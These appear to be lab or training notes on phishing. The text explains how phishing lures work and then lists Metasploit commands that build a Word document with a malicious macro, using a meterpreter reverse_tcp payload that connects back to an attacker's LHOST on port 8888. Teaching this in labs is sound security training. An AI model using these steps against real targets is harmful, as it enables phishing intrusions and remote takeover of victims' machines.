## He had a brain full of macros, and had shells in his soul.

Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.

One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.

You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
    
- `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
- `set LHOST <IP>` specifies the IP address of the attacker’s system.
- `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox.
- `show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
- `exploit` generates a macro and embeds it in a document
- `exit` to quit and return to the terminal.

![[MS Macro.png]]
